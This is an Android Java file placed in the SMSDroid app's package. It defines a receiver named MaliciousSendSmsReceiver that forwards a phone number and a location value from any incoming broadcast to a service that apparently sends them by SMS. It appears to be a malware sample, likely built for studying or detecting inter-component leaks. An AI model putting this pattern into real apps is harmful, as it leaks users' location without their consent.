package de.ub0r.android.smsdroid;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class MaliciousSendSmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String destination = intent.getStringExtra("number");
        String location = intent.getStringExtra("location");

        Intent modifiedIntent = new Intent(context, MaliciousSendSmsService.class);
        modifiedIntent.putExtra("number", destination);
        modifiedIntent.putExtra("location", location);
        context.startService(modifiedIntent);
    }
}
